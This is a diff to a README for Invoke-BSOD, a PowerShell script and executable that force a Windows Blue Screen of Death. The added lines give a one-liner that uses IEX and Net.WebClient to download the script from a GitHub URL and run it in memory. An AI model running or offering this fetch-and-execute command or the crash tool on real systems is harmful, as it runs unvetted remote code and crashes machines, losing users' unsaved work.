@@ -12,7 +12,10 @@ Usage:
 PS>Import-Module .\Invoke-BSOD.ps1
 PS>Invoke-BSOD
 ```
-
+OR...
+```
+PS>IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+```
 ### BSOD.exe
 
 A compiled executable that also create a Blue Screen of Death.
